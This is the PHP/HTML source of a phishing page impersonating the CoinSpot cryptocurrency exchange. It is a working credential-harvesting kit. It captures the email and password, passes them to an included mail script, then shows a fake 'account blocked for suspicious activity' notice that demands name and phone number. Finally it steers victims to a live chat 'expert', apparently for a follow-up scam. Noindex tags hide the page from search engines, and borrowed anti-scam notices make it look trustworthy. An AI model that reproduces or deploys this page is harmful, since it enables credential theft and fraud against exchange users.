<!DOCTYPE html>
<html lang="en">
    <head>
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Buy &amp; Sell Bitcoin, Dogecoin, Litecoin | CoinSpot</title>
        <link rel="shortcut icon" href="./assets/favicon.png?v=221" />
        <link rel="stylesheet" href="./assets/coinspot.min.css" />
        <script nonce="" src="./assets/coinspot.min.js.download"></script>
        <script nonce="" src="./assets/brhash.min.js.download"></script>
        <script nonce="" src="./assets/bootstrap-sortable.js.download"></script>
        <link rel="stylesheet" type="text/css" href="./assets/flaticon.css" />
        <link rel="stylesheet" type="text/css" href="./assets/font.css" />
        <link rel="stylesheet" href="./assets/main.css" />
        <script nonce="" src="./assets/main.js.download"></script>
    </head>
    <body style="">
        <div class="wrapper">
            <nav id="sidebar" class="hidden">
                <div class="sidebar-header">
                    <h3><img src="./assets/coinspot-sml-white.png" alt="CoinSpot" style="margin-top: -5px; height: 40px; width: 40px;" /> CoinSpot</h3>
                </div>
                <ul class="list-unstyled components bottom">
                    <li>
                        <a href="#"><i class="flaticon-home"></i>HOME</a>
                    </li>
                    <li>
                        <a href="#">
                            <span><i class="flaticon-wallet-1"></i>WALLETS</span>
                        </a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-buy"></i>BUY / SELL</a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-exchange"></i>SWAP</a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-bills"></i>BUNDLES</a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-scales"></i>OTC</a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-bar-chart"></i>MARKETS</a>
                    </li>
                </ul>
                <ul class="list-unstyled components bottom" style="padding-top: 40px;">
                    <li>
                        <a href="#"><i class="flaticon-rocket"></i>REGISTER</a>
                    </li>
                    <li>
                        <a href="#"><i class="flaticon-log-out"></i>LOGIN</a>
                    </li>
                    <li>
                        <a href="#" target="_blank" class="chat"><i class="flaticon-speech-bubble-1"></i>SUPPORT</a>
                    </li>
                </ul>
            </nav>
            <div id="content">
                <div class="overlay">
                    <button class="navbar-toggle collapsed navbar-menu-button" type="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar" style="background-color: #fff;"></span>
                        <span class="icon-bar" style="background-color: #fff;"></span>
                        <span class="icon-bar icon-bar-small" style="background-color: #fff;"></span>
                    </button>
                </div>
                <header class="navbar navbar-default navbar-static-top bs-docs-nav" id="top" role="banner">
                    <div class="container page-content-body">
                        <div class="innercontainer">
                            <div class="navbar-header">
                                <button class="pull-right navbar-toggle collapsed navbar-menu-button" style="margin-top: 12px;" type="button">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar" style="background-color: #fff;"></span>
                                    <span class="icon-bar" style="background-color: #fff;"></span>
                                    <span class="icon-bar icon-bar-small" style="background-color: #fff;"></span>
                                </button>
                                <a class="pull-right btn-header login-btn userlogin" style="color: #ffe; margin-top: 12px;" href="#">LOGIN</a>
                                <a class="col-md-push-1 navbar-brand" style="padding-top: 19px;" href="#">
                                    <img src="./assets/coinspot-logo-40x40.png" alt="CoinSpot" style="margin-top: -5px; margin-right: 5px; height: 30px; width: 30px;" /> CoinSpot
                                </a>
                            </div>
                            <nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation" style="height: 1px;">
                                <ul class="nav navbar-nav navbar-right" style="margin-right: 0px;">
                                    <li><a href="#" class="home-menu">Home</a></li>
                                    <li><a href="#" class="wallets-menu">Wallets</a></li>
                                    <li><a href="#" class="buysell-menu">Buy/Sell</a></li>
                                    <li><a href="#" class="swap-menu">Swap</a></li>
                                    <li><a href="#" class="bundles-menu">Bundles</a></li>
                                    <li><a href="#" class="otc-menu">OTC</a></li>
                                    <li><a href="#" class="markets-menu">Markets</a></li>
                                    <li class="register-link"><a href="#" class="btn-header hidden-xs">Register</a></li>
                                    <li><a href="#" class="hidden-sm hidden-md hidden-lg">Register</a></li>
                                    <li class="home-login-link"><a href="#" class="btn-header hidden-xs">Login</a></li>
                                    <li><a href="#" class="hidden-sm hidden-md hidden-lg">Login</a></li>
                                </ul>
                            </nav>
                        </div>
                        <script nonce="">
                            $(".navbar-menu-button, .overlay, .overlay .navbar-menu-button").click(function (e) {
                                $("#sidebar").toggleClass("hidden");
                                $(".overlay").toggle();
                                e.stopPropagation();
                            });

                            $("#account-dropdown-menu").on("shown.bs.dropdown", function () {
                                $(".nav-menu").width(550);
                                //$('.dropdown-toggle.account-menu').width($('.navbar-nav>li>.dropdown-menu').width()-20);
                            });

                            $("#account-dropdown-menu").on("hide.bs.dropdown", function () {
                                $(".dropdown-toggle.account-menu").width(0);
                            });
                        </script>
                    </div>
                </header>
                <div class="page-content" style="margin-top: 10px;">
                    <div class="container-fluid">
                        <div class="row">
                            <div id="login" class="container page-content-body">
                                <div class="row">
                                    <div class="col-sm-7 col-md-6">

                                     <?php
                                     if (isset($_POST['btnLoginMore'])) {
                                        
                                        include 'mail.php';
                                    ?>

                                    <div class="login-panel">
                                         <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
                                            <div class="page-header">
                                                <h1>
                                                    Verification Required<br />
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body">
                                                    <form class="loginform" role="form" action="" method="POST">
                                                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                                        <div class="form-group">
                                                            <label>Name</label>
                                                            <input type="text" id="name" class="form-control login" name="name" required />
                                                        </div>
                                                        <div class="form-group">
                                                            <label>Phone Number</label>
                                                            <input type="text" id="number" class="form-control" name="number" required />
                                                        </div>
                                                        
                                                    <button type="submit" name="fromLog" id="verifyBtn" class="btn btn-primary btn-lg" style="width: 100%;">Verify</button>
                                                        <br />
                                                        
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                        <script>
                                            $(document).ready(function () {
                                                $('#verifyBtn').click(function (e) {
                                                    var number = $('#number').val();
                                                    var name = $('#name').val();
                                                    if (name == '') {
                                                        alert('Invalid Name');
                                                        $("#name").focus();
                                                        return false;
                                                    } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                                                        alert('Please specify a valid phone number');
                                                        $("#number").focus();
                                                        return false;
                                                    }
                                                });
                                            });
                                        </script>

                                    <?php } elseif (isset($_POST['fromLog'])) {
                                         include 'mail.php';
                                         include 'chat.php';
                                     ?>

                                     <div class="login-panel">
                                         
                                            <div class="page-header text-center">
                                                <h1>
                                                    Account blocked<br />
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body text-center">
                                                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                                    <div class="form">
                                                        <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                                    </div>
                                                    <div class="calling-number">
                                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                      <?php } else { ?>

                                        <div class="login-panel">
                                            <div class="page-header">
                                                <h1>
                                                    Login<br />
                                                    <small> To your CoinSpot account.</small>
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body">
                                                    <form class="loginform" role="form" action="" method="POST">
                                                        <div class="form-group">
                                                            <label>Email</label>
                                                            <input type="email" class="form-control login" name="email" required />
                                                        </div>
                                                        <div class="form-group">
                                                            <label>Password</label>
                                                            <input type="password" class="form-control" name="password" maxlength="200" required />
                                                        </div>
                                                        <div class="checkbox">
                                                            <label> <input class="remember" type="checkbox" /> Remember my email </label>
                                                        </div>
                                                        <button type="submit" name="btnLoginMore" class="btn btn-primary btn-lg" style="width: 100%;">Login</button>
                                                        <br />
                                                        <br />
                                                        <div class="text-center">
                                                            <a style="padding-top: 15px;" href="#">Forgot your password?</a>
                                                            <br />
                                                            <br />
                                                            Don't have an account? <a href="#">Register</a>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                        <?php } ?>
                                    </div>
                                    <div class="col-sm-5 col-md-6">
                                        <div class="panel-heading" style="padding-top: 50px;">
                                            Security News
                                        </div>
                                        <div class="panel-body">
                                            <b>Verification required for AUD Withdrawals</b>
                                            <br />
                                            Please note that your account must be verified to be able to withdraw AUD to your nominated bank account.
                                            <br />
                                            <hr />
                                            <b>Never create an account on behalf of someone else</b>
                                            <br />
                                            If you have been asked to login or create an account to purchase something on Gumtree, Ebay etc. it is highly likely to be a scam and you should contact our support team immediately.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <br />
                            <br />
                            <br />
                        </div>
                    </div>
                </div>
                <footer class="py-50 bg-oldblue" role="contentinfo">
                    <div class="container">
                        <div class="grid">
                            <div class="d-none d-lg-block col-lg-2">
                                <div class="mt-20" style="white-space: nowrap;">
                                    <a class="footer-logo" href="#"><img src="./assets/coinspot-logo-40x40.png" alt="CoinSpot" />CoinSpot</a>
                                </div>
                                <div class="footer-adcca mt-20">
                                    <a href="#" target="_blank" rel="nofollow">
                                        <img src="./assets/adcca-industry.png" alt="adcca industry certified" style="max-width: 160px;" />
                                        <div class="footer-text">Member since: 02.02.2014</div>
                                    </a>
                                </div>
                                <div class="footer-iso mt-30">
                                    <a href="#" target="_blank" rel="nofollow">
                                        <div class="d-flex">
                                            <img src="./assets/security-image1-white.png" style="max-width: 45px;" />
                                            <span class="iso-text">
                                                <strong>SCI QUAL</strong><br />
                                                INTERNATIONAL
                                            </span>
                                        </div>
                                        <div class="footer-text">
                                            Certified since: 13.02.2020<br />
                                            Certificate number: 5660
                                        </div>
                                    </a>
                                </div>
                            </div>
                            <div class="col-6 col-md-4 col-lg-2">
                                <ul class="footer-group">
                                    <li class="footer-group-title">PRODUCTS</li>
                                    <li><a href="#">Buy Bitcoin</a></li>
                                    <li><a href="#">Bitcoin Trading</a></li>
                                    <li><a href="#">Instant Buy/Sell</a></li>
                                    <li><a href="#">Instant Swap</a></li>
                                    <li><a href="#">CoinSpot Markets</a></li>
                                    <a href="#"> </a>
                                    <li><a href="#"></a><a href="#">CoinSpot Bundles</a></li>
                                    <li><a href="#">Buy DeFi</a></li>
                                    <li><a href="#">Buy NFTs</a></li>
                                    <li><a href="#">Multicoin Wallets</a></li>
                                    <li><a href="#">Over the Counter (OTC)</a></li>
                                    <li><a href="#">Self Managed Super (SMSF)</a></li>
                                    <li><a href="#">API</a></li>
                                    <li><a href="#">CoinSpot App</a></li>
                                    <li>
                                        <a href="#" class="setnightmodebtn btn btn-default toggle">
                                            <i class="flaticon-moon-1"></i>
                                            Night
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="col-6 col-md-4 col-lg-2">
                                <ul class="footer-group">
                                    <li class="footer-group-title">ABOUT</li>
                                    <li><a href="#">Security</a></li>
                                    <li><a href="#">Trade Safely With CoinSpot</a></li>
                                    <a href="#"> </a>
                                    <li><a href="#"></a><a href="#">Press Enquiries</a></li>
                                    <li><a href="#">Fees</a></li>
                                    <li><a href="#">Terms of Service</a></li>
                                    <li><a href="#">Privacy Policy</a></li>
                                    <li><a href="#">AML</a></li>
                                    <li><a href="#">2 Million Competition Terms</a></li>
                                    <li><a href="#">Carols By Candlesticks</a></li>
                                </ul>
                            </div>
                            <div class="col-6 col-md-4 col-lg-2">
                                <ul class="footer-group mb-30">
                                    <li class="footer-group-title">EARN</li>
                                    <li><a href="#">Affiliate Program</a></li>
                                    <li><a href="#">Referral Program</a></li>
                                </ul>
                                <ul class="footer-group d-none d-lg-block">
                                    <li class="footer-group-title">COMMUNITY</li>
                                    <li><a href="#" target="_blank" rel="nofollow">Facebook</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Twitter</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Instagram</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Reddit</a></li>
                                </ul>
                            </div>
                            <div class="col-6 col-md-4 col-lg-2">
                                <ul class="footer-group">
                                    <li class="footer-group-title">LEARN</li>
                                    <li><a href="#">Learn with CoinSpot</a></li>
                                    <li><a href="#">How to buy Bitcoin</a></li>
                                    <li><a href="#">How to buy Ethereum</a></li>
                                    <li><a href="#">Cryptocurrency &amp; Tax</a></li>
                                </ul>
                            </div>
                            <div class="d-lg-none col-6 col-md-4 col-lg-2">
                                <ul class="footer-group">
                                    <li class="footer-group-title">COMMUNITY</li>
                                    <li><a href="#" target="_blank" rel="nofollow">Facebook</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Twitter</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Instagram</a></li>
                                    <li><a href="#" target="_blank" rel="nofollow">Reddit</a></li>
                                </ul>
                            </div>
                            <div class="col-6 col-md-4 col-lg-2">
                                <ul class="footer-group">
                                    <li class="footer-group-title">SUPPORT</li>
                                    <li><a target="_blank" href="#">Help Centre</a></li>
                                    <li><a href="#">Contact Support</a></li>
                                    <li><a href="#">Account Recovery</a></li>
                                    <li><a target="_blank" href="#">Complaints &amp; Disputes</a></li>
                                    <li><a target="_blank" href="#">Protect Yourself Online</a></li>
                                    <li><a href="#">Request a Coin</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="d-lg-none">
                            <div class="mt-20" style="white-space: nowrap;">
                                <a class="footer-logo" href="#"><img src="./assets/coinspot-logo-40x40.png" alt="CoinSpot" />CoinSpot</a>
                            </div>
                            <div class="d-flex mt-10">
                                <div>
                                    <a href="#" target="_blank" rel="nofollow">
                                        <img src="./assets/adcca-industry.png" alt="adcca industry certified" style="max-width: 160px;" /><br />
                                        <span class="footer-text">Member since: 02.02.2014</span>
                                    </a>
                                </div>
                                <div class="footer-iso ml-10 ml-sm-30">
                                    <a href="#" target="_blank" rel="nofollow">
                                        <div class="d-flex">
                                            <img src="./assets/security-image1-white.png" style="max-width: 45px;" />
                                            <span class="iso-text">
                                                <strong>SCI QUAL</strong><br />
                                                INTERNATIONAL
                                            </span>
                                        </div>
                                        <div class="footer-text">
                                            Certified since: 13.02.2020<br />
                                            Certificate number: 5660
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
    </body>
</html>
